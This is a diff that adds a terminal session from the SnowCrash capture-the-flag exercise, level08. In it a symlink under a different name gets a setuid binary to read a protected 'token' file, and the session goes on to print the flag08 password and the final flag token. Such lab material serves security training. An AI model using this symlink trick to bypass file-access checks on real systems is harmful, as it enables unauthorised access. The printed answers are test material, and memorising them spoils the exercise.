@@ -1,0 +1,18 @@
+level08@SnowCrash:~$ ln -s token /tmp/run_me
+level08@SnowCrash:~$ ./level08 /tmp_run_me
+level08: Unable to open /tmp_run_me: No such file or directory
+level08@SnowCrash:~$ ./level08 /tmp/run_me
+level08: Unable to open /tmp/run_me: No such file or directory
+level08@SnowCrash:~$ ls /tmp
+ls: cannot open directory /tmp: Permission denied
+level08@SnowCrash:~$ ln -s $PWD'/token' /tmp/not
+level08@SnowCrash:~$ cat /tmp/not
+cat: /tmp/not: Permission denied
+level08@SnowCrash:~$ ./level08 /tmp/not
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+flag08@SnowCrash:~$
